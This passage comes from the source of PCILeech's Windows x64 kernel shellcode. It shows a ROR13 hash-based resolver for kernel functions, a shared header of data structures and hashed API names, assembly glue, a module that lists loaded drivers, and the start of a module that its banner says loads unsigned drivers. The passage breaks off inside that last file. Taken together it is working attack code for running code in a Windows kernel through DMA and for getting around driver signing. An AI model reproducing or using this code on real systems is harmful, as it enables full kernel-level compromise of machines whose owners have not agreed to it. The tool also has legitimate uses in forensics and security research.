	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			if(dwFnIdx >= exp->NumberOfFunctions) { return 0; }
			return (QWORD)(hModule + pdwRVAAddrFunctions[dwFnIdx]);
		}
	}
	return 0;
}

// see http://alter.org.ua/docs/nt_kernel/procaddr/
QWORD KernelGetModuleBase(_In_ PKERNEL_FUNCTIONS fnk, _In_ LPSTR szModuleName)
{
	PBYTE pbSystemInfoBuffer;
	SIZE_T cbSystemInfoBuffer = 0;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSME;
	QWORD i, qwAddrModuleBase = 0;
	fnk->ZwQuerySystemInformation(11, NULL, 0, (PULONG)&cbSystemInfoBuffer);
	if(!cbSystemInfoBuffer) { return 0; }
	pbSystemInfoBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSystemInfoBuffer);
	if(!pbSystemInfoBuffer) { return 0; }
	if(0 == fnk->ZwQuerySystemInformation(11, pbSystemInfoBuffer, (ULONG)cbSystemInfoBuffer, (PULONG)&cbSystemInfoBuffer)) {
		pSME = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Module;
		for(i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count; i++) {
			if(0 == fnk->_stricmp(szModuleName, pSME[i].ImageName + pSME[i].PathLength)) {
				qwAddrModuleBase = pSME[i].Base;
			}
		}
	}
	if(pbSystemInfoBuffer) { fnk->ExFreePool(pbSystemInfoBuffer); }
	return qwAddrModuleBase;
}

VOID InitializeKernelFunctions(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS fnk)
{
	DWORD i = 0, NAMES[25];
	NAMES[i++] = H__stricmp;
	NAMES[i++] = H_ExAllocatePool;
	NAMES[i++] = H_ExFreePool;
	NAMES[i++] = H_IoCreateDriver;
	NAMES[i++] = H_KeDelayExecutionThread;
	NAMES[i++] = H_KeGetCurrentIrql;
	NAMES[i++] = H_MmGetPhysicalAddress;
	NAMES[i++] = H_MmLoadSystemImage;
	NAMES[i++] = H_MmMapIoSpace;
	NAMES[i++] = H_MmUnloadSystemImage;
	NAMES[i++] = H_MmUnmapIoSpace;
	NAMES[i++] = H_RtlAnsiStringToUnicodeString;
	NAMES[i++] = H_RtlCopyMemory;
	NAMES[i++] = H_RtlFreeUnicodeString;
	NAMES[i++] = H_RtlInitAnsiString;
	NAMES[i++] = H_RtlInitUnicodeString;
	NAMES[i++] = H_RtlZeroMemory;
	NAMES[i++] = H_ZwClose;
	NAMES[i++] = H_ZwCreateFile;
	NAMES[i++] = H_ZwOpenFile;
	NAMES[i++] = H_ZwQueryDirectoryFile;
	NAMES[i++] = H_ZwQuerySystemInformation;
	NAMES[i++] = H_ZwSetSystemInformation;
	NAMES[i++] = H_ZwReadFile;
	NAMES[i++] = H_ZwWriteFile;
	while(i) {
		i--;
		*((PQWORD)fnk + i) = (QWORD)PEGetProcAddressH(qwNtosBase, NAMES[i]);
	}
}

DWORD PEGetImageSize(_In_ QWORD hModule)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	if(!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { return 0; }
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)hModule + dosHeader->e_lfanew); // nt header
	if(!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE) { return 0; }
	return ntHeader->OptionalHeader.SizeOfImage;
}

VOID CommonSleep(_In_ PKERNEL_FUNCTIONS fnk, _In_ DWORD ms)
{
	LONGLONG llTimeToWait = -10000LL * ms;
	fnk->KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
}

BOOL _WriteLargeOutput_WaitForAck(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKMDDATA pk)
{
	PEXEC_IO pis = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_IS);
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	while((pk->_op == KMD_CMD_EXEC_EXTENDED) && ((pis->magic != EXEC_IO_MAGIC) || (!pis->bin.fCompletedAck && (pis->bin.seqAck != pos->bin.seq)))) {
		CommonSleep(fnk, 25);
	}
	return (pk->_op == KMD_CMD_EXEC_EXTENDED) && !pis->bin.fCompletedAck;
}

BOOL WriteLargeOutput_WaitNext(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	pos->magic = EXEC_IO_MAGIC;
	CacheFlush();
	pos->bin.seq++;
	pk->_op = KMD_CMD_EXEC_EXTENDED;
	return _WriteLargeOutput_WaitForAck(fnk, pk);
}

VOID WriteLargeOutput_Finish(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	WriteLargeOutput_WaitNext(fnk, pk);
	pk->dataOutExtraLength = 0;
	CacheFlush();
	pos->bin.fCompleted = TRUE;
	pos->bin.seq++;
	_WriteLargeOutput_WaitForAck(fnk, pk);
	pk->_op = KMD_CMD_EXEC;
}

```

`pcileech_shellcode/wx64_common.h`:

```h
// wx64_common.h : declarations of commonly used shellcode functions
// Compatible with Windows x64.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __WX64_COMMON_H__
#define __WX64_COMMON_H__
#include <windows.h>
#include "statuscodes.h"

#pragma warning( disable : 4047 4055 4127 4200 4201 4204)

typedef unsigned __int64		QWORD, *PQWORD;
typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;
typedef struct _EPROCESS *PEPROCESS;
typedef struct _ETHREAD *PETHREAD;
//#define _bs64 _byteswap_uint64  
#define _bs32(x) ((x << 24) | (x >> 24) | ((x << 8) & 0x00ff0000 ) | ((x >> 8) & 0x0000ff00))
#define _bs16(x) ((x << 8) | (x >> 8))

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NT_INFORMATION(Status) ((((ULONG)(Status)) >> 30) == 1)
#define NT_WARNING(Status) ((((ULONG)(Status)) >> 30) == 2)
#define NT_ERROR(Status) ((((ULONG)(Status)) >> 30) == 3)

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define EXEC_IO_MAGIC					0x12651232dfef9521
#define EXEC_IO_CONSOLE_BUFFER_SIZE		0x800
#define EXEC_IO_DMAOFFSET_IS			0x80000
#define EXEC_IO_DMAOFFSET_OS			0x81000
typedef struct tdEXEC_IO {
	QWORD magic;
	struct {
		QWORD cbRead;
		QWORD cbReadAck;
		QWORD Reserved[10];
		BYTE  pb[800];
	} con;
	struct {
		QWORD seq;
		QWORD seqAck;
		QWORD fCompleted;
		QWORD fCompletedAck;
	} bin;
	QWORD Reserved[395];
} EXEC_IO, *PEXEC_IO;

// system information class 11
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	ULONG Unknown1;
	ULONG Unknown2;
	ULONG Unknown3;
	ULONG Unknown4;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	ULONG Unknown1;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _ANSI_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR  Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES {
	QWORD Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	QWORD Attributes;
	PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemProcessInformation = 5, 
	SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef CCHAR KPROCESSOR_MODE;

typedef enum _MODE {
	KernelMode,
	UserMode,
	MaximumMode
} MODE;

typedef enum _MEMORY_CACHING_TYPE {
	MmNonCached = 0,
	MmCached = 1,
	MmWriteCombined = 2,
	MmHardwareCoherentCached = 3,
	MmNonCachedUnordered = 4,
	MmUSWCCached = 5,
	MmMaximumCacheType = 6
} MEMORY_CACHING_TYPE;

#undef RtlCopyMemory
#undef RtlZeroMemory
typedef struct tdKERNEL_FUNCTIONS {
	int(*_stricmp)(
		const char *string1,
		const char *string2);
	PVOID(*ExAllocatePool)(
		_In_ QWORD PoolType,
		_In_ SIZE_T NumberOfBytes);
	VOID(*ExFreePool)(
		_In_ PVOID P);
	NTSTATUS(*IoCreateDriver)(
		_In_opt_ PUNICODE_STRING DriverName,
		_In_ QWORD  PDriverEntry
		);
	NTSTATUS(*KeDelayExecutionThread)(
		_In_ KPROCESSOR_MODE WaitMode,
		_In_ BOOLEAN         Alertable,
		_In_ PINT64          pllInterval_Neg100ns
		);
	KIRQL(*KeGetCurrentIrql)(
		);
	QWORD(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	NTSTATUS(*MmLoadSystemImage)(
		_In_ PUNICODE_STRING  FileName,
		_In_opt_ PUNICODE_STRING NamePrefix,
		_In_opt_ PUNICODE_STRING LoadedName,
		_In_ ULONG  Flags,
		_Out_ PVOID *ModuleObject,
		_Out_ PVOID *ImageBaseAddress
		);
	PVOID(*MmMapIoSpace)(
		_In_  QWORD  PhysicalAddress,
		_In_  SIZE_T NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	NTSTATUS(*MmUnloadSystemImage)(
		_In_ PVOID *ModuleObject
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	NTSTATUS(*RtlAnsiStringToUnicodeString)(
		_Inout_ PUNICODE_STRING DestinationString,
		_In_    PANSI_STRING    SourceString,
		_In_    BOOLEAN         AllocateDestinationString
		);
	VOID(*RtlCopyMemory)(
		_Out_ VOID UNALIGNED *Destination,
		_In_ const VOID UNALIGNED *Source,
		_In_ SIZE_T Length
		);
	VOID(*RtlFreeUnicodeString)(
		_Inout_ PUNICODE_STRING UnicodeString
		);
	VOID(*RtlInitAnsiString)(
		_Out_    PANSI_STRING DestinationString,
		_In_opt_ PCSTR         SourceString
		);
	VOID(*RtlInitUnicodeString)(
		_Out_ PUNICODE_STRING DestinationString,
		_In_opt_ PCWSTR SourceString
		);
	VOID(*RtlZeroMemory)(
		_Out_ VOID UNALIGNED *Destination,
		_In_ SIZE_T Length
		);
	NTSTATUS(*ZwClose)(
		_In_ HANDLE hObject
		);
	NTSTATUS(*ZwCreateFile)(
		_Out_	 PHANDLE			FileHandle, 
		_In_	 ACCESS_MASK		DesiredAccess, 
		_In_	 PVOID				ObjectAttributes, 
		_Out_	 PIO_STATUS_BLOCK	IoStatusBlock, 
		_In_opt_ PLARGE_INTEGER		AllocationSize, 
		_In_	 ULONG				FileAttributes, 
		_In_	 ULONG				ShareAccess, 
		_In_	 ULONG				CreateDisposition,
		_In_	 ULONG				CreateOptions, 
		_In_reads_bytes_opt_(EaLength) PVOID EaBuffer, 
		_In_	 ULONG				EaLength
		);
	NTSTATUS(*ZwOpenFile)(
		_Out_	 PHANDLE            FileHandle,
		_In_	 ACCESS_MASK        DesiredAccess,
		_In_	 POBJECT_ATTRIBUTES ObjectAttributes,
		_Out_	 PIO_STATUS_BLOCK   IoStatusBlock,
		_In_	 ULONG              ShareAccess,
		_In_	 ULONG              OpenOptions
		);
	NTSTATUS(*ZwQueryDirectoryFile)(
		_In_	 HANDLE				FileHandle,
		_In_opt_ HANDLE				Event,
		_In_opt_ PVOID				ApcRoutine,
		_In_opt_ PVOID				ApcContext,
		_Out_	 PIO_STATUS_BLOCK	IoStatusBlock,
		_Out_	 PVOID				FileInformation,
		_In_	 ULONG				Length,
		_In_	 QWORD				FileInformationClass,
		_In_	 BOOLEAN			ReturnSingleEntry,
		_In_opt_ PUNICODE_STRING	FileName,
		_In_	 BOOLEAN			RestartScan
	);
	NTSTATUS(*ZwQuerySystemInformation)(
		_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
		_Inout_ PVOID SystemInformation,
		_In_ ULONG SystemInformationLength,
		_Out_opt_ PULONG ReturnLength);
	NTSTATUS(*ZwSetSystemInformation)(
		_In_ QWORD SystemInformationClass,
		_In_ PVOID SystemInformation,
		_In_ ULONG SystemInformationLength
		);
	NTSTATUS(*ZwReadFile)(
		_In_     HANDLE           FileHandle,
		_In_opt_ HANDLE           Event,
		_In_opt_ PVOID			  ApcRoutine,
		_In_opt_ PVOID            ApcContext,
		_Out_    PIO_STATUS_BLOCK IoStatusBlock,
		_Out_    PVOID            Buffer,
		_In_     ULONG            Length,
		_In_opt_ PQWORD           ByteOffset,
		_In_opt_ PULONG           Key
		);
	NTSTATUS(*ZwWriteFile)(
		_In_ HANDLE FileHandle, 
		_In_opt_ HANDLE Event,
		_In_opt_ PVOID ApcRoutine,
		_In_opt_ PVOID ApcContext,
		_Out_ PVOID IoStatusBlock, 
		_In_reads_bytes_(Length) PVOID Buffer,
		_In_ ULONG Length, 
		_In_opt_ PLARGE_INTEGER ByteOffset, 
		_In_opt_ PULONG Key
		);
	PVOID pvStart;
} KERNEL_FUNCTIONS, *PKERNEL_FUNCTIONS;

// ----------------------------- ROR13 HASHES BELOW -----------------------------

#define H__stricmp								0xd73b454a
#define H_strnlen								0xe0fb3ba8
#define H_wcscat								0x690e4970
#define H_CiInitialize							0x0c2e8015
#define H_ExAllocatePool						0x3707e062
#define H_ExFreePool							0x9d489d1f
#define H_IoAllocateMdl							0xfb94c65d
#define H_IoCreateDriver						0xdccc7ba1
#define H_KeDelayExecutionThread				0x58586d92
#define H_KeGetCurrentIrql						0x4d90adce
#define H_KeInitializeApc						0x2b988da3
#define H_KeInsertQueueApc						0x88c695f9
#define H_KeStackAttachProcess					0x9e0047be
#define H_KeUnstackDetachProcess				0xf047dcf4
#define H_MmAllocateContiguousMemory			0x9f361ebc
#define H_MmFreeContiguousMemory				0x1345f592
#define H_MmGetPhysicalAddress					0x5a326357
#define H_MmGetPhysicalMemoryRanges				0x4977a56f
#define H_MmLoadSystemImage						0x6a6ab58f
#define H_MmMapIoSpace							0x05ddbef9
#define H_MmMapLockedPagesSpecifyCache			0xbceb1dcd
#define H_MmProbeAndLockPages					0x97d00e2b
#define H_MmUnloadSystemImage					0x9db338f7
#define H_MmUnmapIoSpace						0x6c6ec5c9
#define H_ObDereferenceObject					0x2e053fd6
#define H_PsCreateSystemThread					0x94a06b02
#define H_PsGetProcessImageFileName				0x8be7eeec
#define H_PsLookupProcessByProcessId			0xa3a0b82a
#define H_PsLookupThreadByThreadId				0x0e0b0e0d
#define H_RtlAnsiStringToUnicodeString			0xeb6c8389
#define H_RtlCompareMemory						0x770dcef6
#define H_RtlCopyMemory							0xcf64979b
#define H_RtlCreateUserThread					0x442f2041
#define H_RtlFreeUnicodeString					0xa8b2c02a
#define H_RtlInitAnsiString						0x7cc3283d
#define H_RtlInitUnicodeString					0x3035d02a
#define H_RtlZeroMemory							0xc53d4fdb
#define H_ZwAllocateVirtualMemory				0xd33d4aed
#define H_ZwClose								0x5d044c61
#define H_ZwCreateFile							0xc3a08f9d
#define H_ZwCreateKey							0x11c719c1
#define H_ZwDeleteFile							0xb6b0987d
#define H_ZwLoadDriver							0x0675aa53
#define H_ZwOpenFile							0x8829d4b8
#define H_ZwOpenProcess							0xf0d09d60
#define H_ZwReadFile							0x87fd3516
#define H_ZwQueryDirectoryFile					0x6fb06450
#define H_ZwQueryInformationFile				0xd7cd4118
#define H_ZwQuerySystemInformation				0xe661cae2
#define H_ZwSetSystemInformation				0xf7e624de
#define H_ZwSetValueKey							0x03a49be5
#define H_ZwUnloadDriver						0xf36cb1c0
#define H_ZwWriteFile							0x680e3136

// ----------------------------- FUNCTION DECLARATIONS BELOW -----------------------------

DWORD HashROR13A(_In_ LPCSTR sz);
QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH);
QWORD KernelGetModuleBase(_In_ PKERNEL_FUNCTIONS fnk, _In_ LPSTR szModuleName);
VOID InitializeKernelFunctions(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS fnk);
DWORD PEGetImageSize(_In_ QWORD hModule);
VOID CommonSleep(_In_ PKERNEL_FUNCTIONS fnk, _In_ DWORD ms);
extern QWORD GetCR3();
extern VOID CacheFlush();

/*
* If a large output is to be written to PCILeech which won't fit in the DMA
* buffer - write as much as possible in the DMA buffer and then call this fn.
* When returned successfully write another chunk to this buffer and call again.
* WriteLargeOutput_Finish must be called after all data is written to clean up.
* -- fnk
* -- pk
* -- return
*/
BOOL WriteLargeOutput_WaitNext(_In_ PKERNEL_FUNCTIONS fnk, PKMDDATA pk);

/*
* Clean up function that must be called if WriteLargeOutput_WaitNext has
* previously been called.
* -- fnk
* -- pk
*/
VOID WriteLargeOutput_Finish(_In_ PKERNEL_FUNCTIONS fnk, PKMDDATA pk);

#endif /* __WX64_COMMON_H__ */
```

`pcileech_shellcode/wx64_common_a.asm`:

```asm
; wx64_common_a.asm : assembly to receive execution from stage3 exec command.
; Compatible with Windowx 64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
main PROTO
EXTRN c_EntryPoint:NEAR

; -------------------------------------
; Code
; -------------------------------------
.CODE

main PROC
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

GetCR3 PROC
	MOV rax, cr3
	RET
GetCR3 ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP

END

```

`pcileech_shellcode/wx64_driverinfo.c`:

```c
// wx64_driverinfo.c : kernel code to list loaded drivers
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_driverinfo.c
// ml64 wx64_common_a.asm /Fewx64_driverinfo.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_driverinfo.obj wx64_common.obj
// shellcode64.exe -o wx64_driverinfo.exe "LOADED KERNEL MODULES AND INFORMATION                          \n===============================================================\nDEFAULT: listing of all kernel modules                         \n   Default listing is as follows:                              \n   BYTES      DATA                                             \n   0x00-17    module name                                      \n   0x18-1d    ----->                                           \n   0xe1-1f    module index                                     \nDETAILS: show detailed module information                      \n   Use -s <module_name> OR -0 0x<module_index> to show         \n   details for specific module.                                \n===== MODULE DETAILED INFORMATION =============================\nMODULE NAME   : %s                                             \nBASE ADDR VIRT: 0x%016llX                                      \nBASE ADDR PHYS: 0x%016llX                                      \nSIZE          : 0x%08X                                         \nFLAGS         : 0x%08X                                         \nLOAD COUNT    : 0x%04X                                         \nINDEX         : 0x%04X                                         \n===============================================================\nIN TOTAL %i ENTRIES EXISTS, SEE BELOW FOR MORE INFORMATION     \n(information not shown when module details are shown)\n"
//
#include "wx64_common.h"

VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk)
{
	PBYTE pbSystemInfoBuffer;
	SIZE_T cbSystemInfoBuffer = 0;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSME;
	QWORD b, i, j, qwAddrOut;
	fnk->ZwQuerySystemInformation(11, NULL, 0, (PULONG)&cbSystemInfoBuffer);
	if(!cbSystemInfoBuffer) { return; }
	pbSystemInfoBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSystemInfoBuffer);
	if(!pbSystemInfoBuffer) { return; }
	if(0 == fnk->ZwQuerySystemInformation(SystemModuleInformation, pbSystemInfoBuffer, (ULONG)cbSystemInfoBuffer, (PULONG)&cbSystemInfoBuffer)) {
		pk->dataOut[6] = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count;
		pSME = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Module;
		qwAddrOut = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLength;
		for(i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count; i++) {
			qwAddrOut = pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLength;
			pk->dataOutExtraLength += 0x20;
			b = 1;
			for(j = 0; j < 24; j++) {
				if(b) {
					b = *(PBYTE)(qwAddrOut + j) = pSME[i].ImageName[pSME[i].PathLength + j];
				} else {
					*(PBYTE)(qwAddrOut + j) = 0;
				}
			}
			*(PQWORD)(qwAddrOut + 0x18) = 0x00003e2d2d2d2d2d;
			*(PBYTE)(qwAddrOut + 0x1E) = pSME[i].Index >> 8;
			*(PBYTE)(qwAddrOut + 0x1F) = pSME[i].Index & 0xff;
		}
	}
	if(pbSystemInfoBuffer) { fnk->ExFreePool(pbSystemInfoBuffer); }
}

VOID ActionDetails(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk)
{
	PBYTE pbSystemInfoBuffer;
	SIZE_T cbSystemInfoBuffer = 0;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSME;
	QWORD i;
	fnk->ZwQuerySystemInformation(11, NULL, 0, (PULONG)&cbSystemInfoBuffer);
	if(!cbSystemInfoBuffer) { return; }
	pbSystemInfoBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSystemInfoBuffer);
	if(!pbSystemInfoBuffer) { return; }
	if(0 == fnk->ZwQuerySystemInformation(SystemModuleInformation, pbSystemInfoBuffer, (ULONG)cbSystemInfoBuffer, (PULONG)&cbSystemInfoBuffer)) {
		pSME = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Module;
		for(i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count; i++) {
			if(0 == fnk->_stricmp(pk->dataInStr, pSME[i].ImageName + pSME[i].PathLength) ||
				(!pk->dataInStr[0] && pSME[i].Index == pk->dataIn[0])) {
				// image name
				fnk->RtlCopyMemory(pk->dataOutStr, pSME[i].ImageName + pSME[i].PathLength, MAX_PATH - pSME[i].PathLength);
				pk->dataOut[0] = pSME[i].Base;
				pk->dataOut[1] = fnk->MmGetPhysicalAddress(pSME[i].Base);
				pk->dataOut[2] = pSME[i].Size;
				pk->dataOut[3] = pSME[i].Flags;
				pk->dataOut[4] = pSME[i].LoadCount;
				pk->dataOut[5] = pSME[i].Index;
				goto cleanup;
			}
		}
	}
cleanup:
	if(pbSystemInfoBuffer) { fnk->ExFreePool(pbSystemInfoBuffer); }
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS fnk;
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	ActionDetails(pk, &fnk);
	if(!pk->dataIn[0] && !pk->dataInStr[0]) {
		ActionDefault(pk, &fnk);
	}
}
```

`pcileech_shellcode/wx64_driverload_svc.c`:

```c
// wx64_driverload_svc.c : kernel code to load both unsigned and signed drivers.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_driverload_svc.c
// ml64 wx64_common_a.asm /Fewx64_driverload_svc.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_driverload_svc.obj wx64_common.obj
// shellcode64 -o wx64_driverload_svc.exe "KERNEL MODULE LOADER - LOAD UNSIGNED DRIVERS BY SERVICE NAME!        \n=====================================================================\nLoads unsigned or signed drivers by registry service or filename.    \nNOTE! If a filename is specified a registry service will be created  \nfor the filename prior to loading the driver. The OS may pop up a    \nbox telling the logged on user about not being able to load an       \nunsigned driver. The registry service key will disappear on reboot.  \nREQUIRED OPTIONS:                                                    \n  -s : service or file name.                                         \n       Example:                                                      \n       "\Registry\Machine\System\CurrentControlSet\Services\mydriver"\n	   "\??\c:\Temp\mydriver.sys"                                    \n===== DRIVER LOAD STATUS (RESULT) ===================================\nSERVICE ENTRY : %s\nLOAD NTSTATUS : 0x%08X                                               \n=====================================================================\n"
//  
#include "wx64_common.h"

//----------------------------------------------------------------------------------------------------------

#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define OBJ_KERNEL_HANDLE       				0x00000200

typedef struct tdKERNEL_FUNCTIONS2 {
	wchar_t*(*wcscat)(
		wchar_t *strDestination,
		const wchar_t *strSource
		);
	NTSTATUS(*ZwCreateKey)(
		_Out_      PHANDLE            KeyHandle,
		_In_       ACCESS_MASK        DesiredAccess,
		_In_       POBJECT_ATTRIBUTES ObjectAttributes,
		_Reserved_ ULONG              TitleIndex,
		_In_opt_   PUNICODE_STRING    Class,
		_In_       ULONG              CreateOptions,
		_Out_opt_  PULONG             Disposition
		);
	NTSTATUS(*ZwLoadDriver)(
		_In_ PUNICODE_STRING DriverServiceName
		);
	NTSTATUS(*ZwSetValueKey)(
		_In_     HANDLE          KeyHandle,
		_In_     PUNICODE_STRING ValueName,
		_In_opt_ ULONG           TitleIndex,
		_In_     ULONG           Type,
		_In_opt_ PVOID           Data,
		_In_     ULONG           DataSize
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->wcscat,							H_wcscat },
		{ &fnk2->ZwCreateKey,						H_ZwCreateKey },
